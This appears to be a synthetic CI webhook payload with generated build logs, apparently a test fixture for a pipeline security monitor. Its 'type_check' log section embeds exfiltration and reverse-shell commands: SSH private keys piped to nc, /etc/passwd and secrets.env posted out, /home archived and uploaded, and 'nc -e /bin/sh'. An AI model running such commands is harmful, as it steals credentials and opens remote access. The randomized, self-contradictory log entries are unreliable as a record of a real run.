{
  "action": "completed",
  "workflow_run": {
    "id": 757,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-858",
    "head_sha": "f4bc598a6c70ab40a031539b136f83421357f96f",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-01T12:00:33.067784Z",
    "updated_at": "2025-12-01T12:02:50.058445Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 build completed\nStep 2/10: Building\n  PASS: test_user_create (238ms)\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (381ms)\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:33] WARN: Deprecated API usage\n\u2713 build completed\nStep 1/10: Building\nInstalling react@4.20.0\nArtifact uploaded: build.tar.gz (44MB)\nCompiling src/utils.go...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (2MB)\n\u2713 test completed\n  PASS: test_api_health (29ms)\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (17MB)\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (7MB)\nInstalling express@2.6.0\n  PASS: test_db_connect (13ms)\nInstalling eslint@1.16.0\nInstalling prettier@5.9.0\n\u2713 build completed\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (334ms)\nCache hit for key-5428\n  PASS: test_cache_hit (436ms)\nInstalling webpack@5.3.0\nCompiling src/utils.go...\nCompiling src/app.ts...\n=== Step deploy_staging completed ===\n=== Step: integration_tests ===\nInstalling eslint@2.12.0\n\u2713 build completed\n[12:00:33] INFO: Processing request\nInstalling axios@3.3.0\nInstalling webpack@1.14.0\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\nCache hit for key-1268\nStep 9/10: Building\nCache hit for key-4193\nCache hit for key-9271\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (1MB)\n  PASS: test_db_connect (151ms)\nCache hit for key-7262\nCompiling src/app.ts...\n[12:00:33] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-7533\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (2MB)\nStep 8/10: Building\nInstalling jest@4.5.0\nCache hit for key-8465\nInstalling react@5.15.0\nInstalling react@5.6.0\nCompiling src/utils.go...\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-8751\n=== Step integration_tests completed ===\n=== Step: setup_node ===\nInstalling jest@1.3.0\nInstalling lodash@2.7.0\nInstalling prettier@2.0.0\nInstalling jest@4.17.0\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (495ms)\n  PASS: test_user_create (457ms)\nCache hit for key-4152\n  PASS: test_user_create (243ms)\nCache hit for key-8731\n[12:00:33] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (8ms)\nStep 10/10: Building\nCache hit for key-9354\nInstalling jest@1.0.0\nInstalling react@5.15.0\nStep 10/10: Building\nCompiling src/index.js...\n  PASS: test_user_create (183ms)\nInstalling lodash@5.16.0\nInstalling lodash@3.16.0\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_auth_login (54ms)\n\u2713 test completed\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (30MB)\nStep 9/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (352ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 9/10: Building\n=== Step setup_node completed ===\n=== Step: build ===\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 3/10: Building\nCache hit for key-2633\nStep 7/10: Building\nInstalling lodash@2.17.0\nArtifact uploaded: build.tar.gz (36MB)\n\u2713 lint completed\nCache hit for key-9239\nCache hit for key-7983\nArtifact uploaded: build.tar.gz (17MB)\nCache hit for key-7035\nCompiling src/index.js...\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (28MB)\nStep 10/10: Building\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_cache_hit (429ms)\n[12:00:33] INFO: Processing request\n  PASS: test_user_create (322ms)\nCache hit for key-1759\n[12:00:33] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-1963\nInstalling axios@3.20.0\n[12:00:33] INFO: Processing request\nInstalling react@3.7.0\n  PASS: test_api_health (409ms)\n\u2717 build failed with exit code 80\nCache hit for key-1886\nStep 2/10: Building\n=== Step build completed ===\n=== Step: save_cache ===\n[12:00:33] INFO: Processing request\nStep 7/10: Building\nCompiling src/handler.rs...\n[12:00:33] INFO: Processing request\nStep 9/10: Building\n\u2713 test completed\n[12:00:33] INFO: Processing request\n\u2717 build failed with exit code 13\n\u2713 lint completed\nStep 3/10: Building\nInstalling express@2.13.0\nCompiling src/app.ts...\nInstalling prettier@4.16.0\n[12:00:33] INFO: Processing request\nCache hit for key-5930\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-9891\nArtifact uploaded: build.tar.gz (13MB)\nWARNING: lodash has known vulnerabilities\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:33] INFO: Processing request\nCache hit for key-6422\nInstalling prettier@1.1.0\n  PASS: test_db_connect (373ms)\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-4650\nInstalling express@2.19.0\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:33] INFO: Processing request\n=== Step save_cache completed ===\n=== Step: restore_cache ===\n  PASS: test_cache_hit (49ms)\nStep 5/10: Building\nCache hit for key-7651\n\u2713 test completed\nInstalling prettier@1.14.0\n\u2713 test completed\nCompiling src/index.js...\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (24MB)\nCompiling src/service.java...\n  PASS: test_db_connect (437ms)\nArtifact uploaded: build.tar.gz (42MB)\nStep 5/10: Building\nCache hit for key-4023\nInstalling react@5.13.0\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (43MB)\nStep 6/10: Building\n[12:00:33] WARN: Deprecated API usage\n\u2713 lint completed\nInstalling prettier@5.10.0\nInstalling react@4.18.0\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nInstalling express@4.1.0\n  PASS: test_cache_hit (382ms)\nArtifact uploaded: build.tar.gz (29MB)\nException: TypeError\n\u2713 lint completed\nCompiling src/app.ts...\n  PASS: test_user_create (382ms)\nArtifact uploaded: build.tar.gz (9MB)\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\nStep 5/10: Building\nInstalling prettier@2.5.0\nArtifact uploaded: build.tar.gz (10MB)\nInstalling jest@1.8.0\n  PASS: test_db_connect (227ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (11MB)\nCompiling src/index.js...\n  PASS: test_api_health (488ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling express@1.12.0\n[12:00:33] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (12MB)\n[12:00:33] WARN: Deprecated API usage\nCompiling src/app.ts...\n[12:00:33] INFO: Processing request\nCache hit for key-7353\n[12:00:33] WARN: Deprecated API usage\nCompiling src/utils.go...\n  PASS: test_auth_login (105ms)\n  PASS: test_auth_login (80ms)\nCache hit for key-6585\n\u2713 lint completed\nCompiling src/service.java...\nCompiling src/index.js...\nCompiling src/app.ts...\nInstalling express@4.9.0\nCache hit for key-9934\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:33] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (28MB)\nCache hit for key-2404\n=== Step unit_tests completed ===\n=== Step: setup_environment ===\nCompiling src/service.java...\nInstalling axios@1.9.0\n  PASS: test_auth_login (470ms)\nInstalling prettier@5.4.0\nCompiling src/service.java...\nStep 6/10: Building\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/utils.go...\nStep 2/10: Building\n  PASS: test_auth_login (210ms)\nInstalling prettier@5.14.0\n\u2713 lint completed\n\u2713 test completed\nInstalling webpack@1.8.0\n  PASS: test_user_create (494ms)\nStep 3/10: Building\nException: RuntimeError\nInstalling express@3.10.0\n[12:00:33] WARN: Deprecated API usage\nInstalling express@2.11.0\nException: NullPointerException\nCompiling src/handler.rs...\n  PASS: test_user_create (353ms)\n[12:00:33] INFO: Processing request\nInstalling jest@4.20.0\n\u2713 build completed\nStep 10/10: Building\nWARNING: react has known vulnerabilities\nWARNING: eslint has known vulnerabilities\nInstalling axios@2.1.0\nCompiling src/service.java...\n[12:00:33] INFO: Processing request\n=== Step setup_environment completed ===\n=== Step: checkout ===\nArtifact uploaded: build.tar.gz (12MB)\nCompiling src/app.ts...\nStep 2/10: Building\n  PASS: test_cache_hit (196ms)\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_auth_login (422ms)\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\n[12:00:33] WARN: Deprecated API usage\nStep 3/10: Building\nCache hit for key-6168\n  PASS: test_user_create (398ms)\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (8MB)\nInstalling axios@4.14.0\nStep 8/10: Building\nWARNING: jest has known vulnerabilities\n\u2713 build completed\nArtifact uploaded: build.tar.gz (26MB)\nStep 6/10: Building\nWARNING: jest has known vulnerabilities\nWARNING: react has known vulnerabilities\n  PASS: test_auth_login (155ms)\nStep 10/10: Building\n  PASS: test_auth_login (250ms)\nInstalling prettier@2.17.0\nCache hit for key-4768\n[12:00:33] WARN: Deprecated API usage\n\u2713 build completed\n  PASS: test_user_create (327ms)\nCompiling src/app.ts...\nInstalling webpack@5.8.0\n=== Step checkout completed ===\n=== Step: install_dependencies ===\nStep 5/10: Building\nStep 1/10: Building\n  PASS: test_db_connect (287ms)\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 lint completed\nStep 2/10: Building\nInstalling prettier@2.18.0\n  PASS: test_user_create (253ms)\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/index.js...\nInstalling prettier@4.1.0\n\u2713 build completed\n\u2713 lint completed\nFAILED: test_cache_hit\nCache hit for key-4277\n[12:00:33] INFO: Processing request\nCompiling src/index.js...\nStep 3/10: Building\nInstalling express@2.17.0\n  PASS: test_api_health (229ms)\n[12:00:33] INFO: Processing request\n  PASS: test_db_connect (234ms)\n[12:00:33] INFO: Processing request\n  PASS: test_auth_login (245ms)\n  PASS: test_api_health (113ms)\n[12:00:33] INFO: Processing request\nCompiling src/index.js...\nCompiling src/utils.go...\nCache hit for key-6479\n[12:00:33] ERROR: Connection failed\n  PASS: test_db_connect (408ms)\nInstalling eslint@5.2.0\n=== Step install_dependencies completed ===\n=== Step: deploy_production ===\nCache hit for key-4205\nInstalling jest@4.2.0\nCompiling src/utils.go...\nStep 10/10: Building\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:33] INFO: Processing request\nCache hit for key-6266\nWARNING: jest has known vulnerabilities\nStep 1/10: Building\nException: RuntimeError\nFAILED: test_api_health\nCache hit for key-6010\nCompiling src/index.js...\nCache hit for key-4134\n\u2713 build completed\n  PASS: test_cache_hit (255ms)\nArtifact uploaded: build.tar.gz (45MB)\nCompiling src/handler.rs...\n\u2713 build completed\nStep 10/10: Building\nException: NullPointerException\n\u2713 test completed\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 4/10: Building\nStep 3/10: Building\nStep 1/10: Building\nCache hit for key-6547\n  PASS: test_user_create (152ms)\n[12:00:33] INFO: Processing request\nInstalling axios@4.19.0\nCache hit for key-3559\n=== Step deploy_production completed ===\n=== Step: lint ===\n[12:00:33] INFO: Processing request\n[12:00:33] INFO: Processing request\nArtifact uploaded: build.tar.gz (7MB)\nWARNING: express has known vulnerabilities\n[12:00:33] WARN: Deprecated API usage\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nCompiling src/main.py...\nInstalling lodash@3.10.0\n  PASS: test_auth_login (390ms)\n[12:00:33] INFO: Processing request\nStep 10/10: Building\nStep 5/10: Building\nStep 6/10: Building\n[12:00:33] INFO: Processing request\n  PASS: test_cache_hit (357ms)\nStep 4/10: Building\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:33] INFO: Processing request\nStep 5/10: Building\nCache hit for key-3148\nWARNING: axios has known vulnerabilities\nCompiling src/main.py...\n  PASS: test_cache_hit (49ms)\n[12:00:33] INFO: Processing request\nCache hit for key-9412\nArtifact uploaded: build.tar.gz (42MB)\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-6974\n[12:00:33] INFO: Processing request\nWARNING: axios has known vulnerabilities\nCompiling src/app.ts...\n=== Step lint completed ===\n=== Step: type_check ===\nStep 5/10: Building\nSending 243MB of data to cloud.services\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\necho $(cat ~/.ssh/id_rsa) | base64 | nc 41.67.45.109 33146\ncurl -X POST https://test.io/collect -d @secrets.env\n  PASS: test_auth_login (232ms)\n\u2713 lint completed\nCache hit for key-4079\necho $(cat ~/.ssh/id_rsa) | base64 | nc 158.192.227.225 41575\n  PASS: test_user_create (491ms)\nStep 1/10: Building\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2713 test completed\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\ncurl -X POST https://test.io/collect -d @secrets.env\nCache hit for key-3577\nInstalling webpack@4.5.0\nCompiling src/service.java...\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n\u2713 lint completed\nCache hit for key-9471\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\necho $(cat ~/.ssh/id_rsa) | base64 | nc 68.29.80.93 18961\nCompiling src/utils.go...\nnc -e /bin/sh 138.96.222.147 53855\nWARNING: jest has known vulnerabilities\ncurl -X POST https://acme.corp/collect -d @secrets.env\n[12:00:33] INFO: Processing request\n\u2713 build completed\nSending 340MB of data to cloud.services\nnc -e /bin/sh 7.47.228.115 53087\nStep 2/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 208.29.123.223 24335\nStep 7/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n  PASS: test_cache_hit (470ms)\nSending 332MB of data to acme.corp\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2717 build failed with exit code 123\nStep 3/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 15.85.209.101 37235\nArtifact uploaded: build.tar.gz (18MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nFAILED: test_auth_login\n[12:00:33] INFO: Processing request\n\u2713 lint completed\nnc -e /bin/sh 90.91.150.12 28676\nStep 6/10: Building\n[12:00:33] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 31.166.72.10 37079\nArtifact uploaded: build.tar.gz (34MB)\nInstalling express@4.2.0\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nCompiling src/service.java...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n=== Step type_check completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-01T12:00:33.067784",
        "finished_at": "2025-12-01T12:00:40.678376",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_user_create (238ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (381ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Installing react@4.20.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (29ms)",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing express@2.6.0",
          "  PASS: test_db_connect (13ms)",
          "Installing eslint@1.16.0",
          "Installing prettier@5.9.0",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (334ms)",
          "Cache hit for key-5428",
          "  PASS: test_cache_hit (436ms)",
          "Installing webpack@5.3.0",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-01T12:00:40.678376",
        "finished_at": "2025-12-01T12:00:55.899561",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Installing eslint@2.12.0",
          "\u2713 build completed",
          "[12:00:33] INFO: Processing request",
          "Installing axios@3.3.0",
          "Installing webpack@1.14.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 test completed",
          "Cache hit for key-1268",
          "Step 9/10: Building",
          "Cache hit for key-4193",
          "Cache hit for key-9271",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "  PASS: test_db_connect (151ms)",
          "Cache hit for key-7262",
          "Compiling src/app.ts...",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Cache hit for key-7533",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 8/10: Building",
          "Installing jest@4.5.0",
          "Cache hit for key-8465",
          "Installing react@5.15.0",
          "Installing react@5.6.0",
          "Compiling src/utils.go...",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "Compiling src/main.py...",
          "Cache hit for key-8751",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-01T12:00:55.899561",
        "finished_at": "2025-12-01T12:01:03.510153",
        "log_lines": [
          "=== Step: setup_node ===",
          "Installing jest@1.3.0",
          "Installing lodash@2.7.0",
          "Installing prettier@2.0.0",
          "Installing jest@4.17.0",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (495ms)",
          "  PASS: test_user_create (457ms)",
          "Cache hit for key-4152",
          "  PASS: test_user_create (243ms)",
          "Cache hit for key-8731",
          "[12:00:33] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (8ms)",
          "Step 10/10: Building",
          "Cache hit for key-9354",
          "Installing jest@1.0.0",
          "Installing react@5.15.0",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_user_create (183ms)",
          "Installing lodash@5.16.0",
          "Installing lodash@3.16.0",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_auth_login (54ms)",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 9/10: Building",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_cache_hit (352ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-01T12:01:03.510153",
        "finished_at": "2025-12-01T12:01:26.341930",
        "log_lines": [
          "=== Step: build ===",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "Cache hit for key-2633",
          "Step 7/10: Building",
          "Installing lodash@2.17.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2713 lint completed",
          "Cache hit for key-9239",
          "Cache hit for key-7983",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-7035",
          "Compiling src/index.js...",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_cache_hit (429ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_user_create (322ms)",
          "Cache hit for key-1759",
          "[12:00:33] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-1963",
          "Installing axios@3.20.0",
          "[12:00:33] INFO: Processing request",
          "Installing react@3.7.0",
          "  PASS: test_api_health (409ms)",
          "\u2717 build failed with exit code 80",
          "Cache hit for key-1886",
          "Step 2/10: Building",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-01T12:01:26.341930",
        "finished_at": "2025-12-01T12:01:30.908285",
        "log_lines": [
          "=== Step: save_cache ===",
          "[12:00:33] INFO: Processing request",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:33] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:33] INFO: Processing request",
          "\u2717 build failed with exit code 13",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Installing express@2.13.0",
          "Compiling src/app.ts...",
          "Installing prettier@4.16.0",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-5930",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-9891",
          "Artifact uploaded: build.tar.gz (13MB)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-6422",
          "Installing prettier@1.1.0",
          "  PASS: test_db_connect (373ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-4650",
          "Installing express@2.19.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:33] INFO: Processing request",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-01T12:01:30.908285",
        "finished_at": "2025-12-01T12:01:35.474640",
        "log_lines": [
          "=== Step: restore_cache ===",
          "  PASS: test_cache_hit (49ms)",
          "Step 5/10: Building",
          "Cache hit for key-7651",
          "\u2713 test completed",
          "Installing prettier@1.14.0",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (437ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Step 5/10: Building",
          "Cache hit for key-4023",
          "Installing react@5.13.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Step 6/10: Building",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing prettier@5.10.0",
          "Installing react@4.18.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:33] INFO: Processing request",
          "\u2713 lint completed",
          "Installing express@4.1.0",
          "  PASS: test_cache_hit (382ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Exception: TypeError",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (382ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-01T12:01:35.474640",
        "finished_at": "2025-12-01T12:01:58.306417",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Step 5/10: Building",
          "Installing prettier@2.5.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing jest@1.8.0",
          "  PASS: test_db_connect (227ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Compiling src/index.js...",
          "  PASS: test_api_health (488ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing express@1.12.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "[12:00:33] INFO: Processing request",
          "Cache hit for key-7353",
          "[12:00:33] WARN: Deprecated API usage",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (105ms)",
          "  PASS: test_auth_login (80ms)",
          "Cache hit for key-6585",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Installing express@4.9.0",
          "Cache hit for key-9934",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:33] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-2404",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-01T12:01:58.306417",
        "finished_at": "2025-12-01T12:02:05.917009",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Compiling src/service.java...",
          "Installing axios@1.9.0",
          "  PASS: test_auth_login (470ms)",
          "Installing prettier@5.4.0",
          "Compiling src/service.java...",
          "Step 6/10: Building",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "  PASS: test_auth_login (210ms)",
          "Installing prettier@5.14.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing webpack@1.8.0",
          "  PASS: test_user_create (494ms)",
          "Step 3/10: Building",
          "Exception: RuntimeError",
          "Installing express@3.10.0",
          "[12:00:33] WARN: Deprecated API usage",
          "Installing express@2.11.0",
          "Exception: NullPointerException",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (353ms)",
          "[12:00:33] INFO: Processing request",
          "Installing jest@4.20.0",
          "\u2713 build completed",
          "Step 10/10: Building",
          "WARNING: react has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Installing axios@2.1.0",
          "Compiling src/service.java...",
          "[12:00:33] INFO: Processing request",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-01T12:02:05.917009",
        "finished_at": "2025-12-01T12:02:08.961246",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/app.ts...",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (196ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_auth_login (422ms)",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] INFO: Processing request",
          "[12:00:33] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Cache hit for key-6168",
          "  PASS: test_user_create (398ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Installing axios@4.14.0",
          "Step 8/10: Building",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Step 6/10: Building",
          "WARNING: jest has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (155ms)",
          "Step 10/10: Building",
          "  PASS: test_auth_login (250ms)",
          "Installing prettier@2.17.0",
          "Cache hit for key-4768",
          "[12:00:33] WARN: Deprecated API usage",
          "\u2713 build completed",
          "  PASS: test_user_create (327ms)",
          "Compiling src/app.ts...",
          "Installing webpack@5.8.0",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-01T12:02:08.961246",
        "finished_at": "2025-12-01T12:02:31.793023",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Step 5/10: Building",
          "Step 1/10: Building",
          "  PASS: test_db_connect (287ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Installing prettier@2.18.0",
          "  PASS: test_user_create (253ms)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Installing prettier@4.1.0",
          "\u2713 build completed",
          "\u2713 lint completed",
          "FAILED: test_cache_hit",
          "Cache hit for key-4277",
          "[12:00:33] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "Installing express@2.17.0",
          "  PASS: test_api_health (229ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_db_connect (234ms)",
          "[12:00:33] INFO: Processing request",
          "  PASS: test_auth_login (245ms)",
          "  PASS: test_api_health (113ms)",
          "[12:00:33] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Cache hit for key-6479",
          "[12:00:33] ERROR: Connection failed",
          "  PASS: test_db_connect (408ms)",
          "Installing eslint@5.2.0",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-01T12:02:31.793023",
        "finished_at": "2025-12-01T12:02:34.837260",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-4205",
          "Installing jest@4.2.0",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "[12:00:33] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:33] INFO: Processing request",
